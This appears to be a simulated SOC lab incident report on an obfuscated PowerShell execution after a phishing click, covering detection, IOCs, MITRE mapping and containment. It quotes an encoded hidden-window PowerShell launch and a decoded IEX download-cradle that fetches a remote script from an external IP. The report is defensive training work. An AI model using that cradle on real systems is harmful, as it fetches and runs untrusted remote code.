# 🚨 Case 01: Suspicious PowerShell Obfuscated Execution

**Date:** 2026-05-22  
**Analyst:** Lucas Rodrigues  
**Severity:** HIGH  
**Environment:** Simulated SOC Lab  
**Tools:** Sysmon, Wireshark, Wazuh, CyberChef, PowerShell

---

# 🧾 Incident Summary

A suspicious PowerShell execution was detected on workstation `WKSTN-FIN-03` after a user clicked on a phishing link received through a web browser.

The PowerShell process was executed using obfuscated parameters and attempted to download a remote payload from an external IP address.

The activity was identified through Sysmon process creation logs and correlated with suspicious outbound network traffic.

---

# 🚨 Detection

## Sysmon Event ID 1 - Process Creation

```powershell
powershell.exe -nop -w hidden -e JABjAGwA...
```

### Suspicious Indicators

- Encoded PowerShell execution
- Hidden window execution
- Suspicious parent process (Chrome)
- External network communication
- In-memory execution behavior

---

#  Investigation & Analysis

## Decoded Payload

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://45.33.32.18/payload.ps1')
```

## Observed Behavior

- PowerShell launched from browser activity
- Remote script download attempt
- Potential command-and-control communication
- Fileless execution technique

---

#  MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|-----------|----|
| Execution | PowerShell | T1059.001 |
| Defense Evasion | Obfuscated Files or Information | T1027 |
| Command and Scripting Interpreter | PowerShell | T1059 |

---

#  IOC Extraction

| Type | Value |
|------|-------|
| External IP | 45.33.32.18 |
| Technique | PowerShell Obfuscation |
| Parent Process | chrome.exe |
| Payload | payload.ps1 |

---

#  Containment Actions

- Terminated malicious PowerShell process
- Blocked external IP communication
- Isolated affected workstation
- Recommended password reset for affected user

---

#  Lessons Learned

- PowerShell logging should be enhanced
- Script Block Logging should be enabled
- Network egress filtering can reduce exposure
- User awareness training remains critical

---

# Evidence & Screenshots

Planned screenshots:
- Sysmon Event Viewer logs
- Wireshark traffic capture
- Wazuh alert dashboard
- CyberChef Base64 decoding
- Incident timeline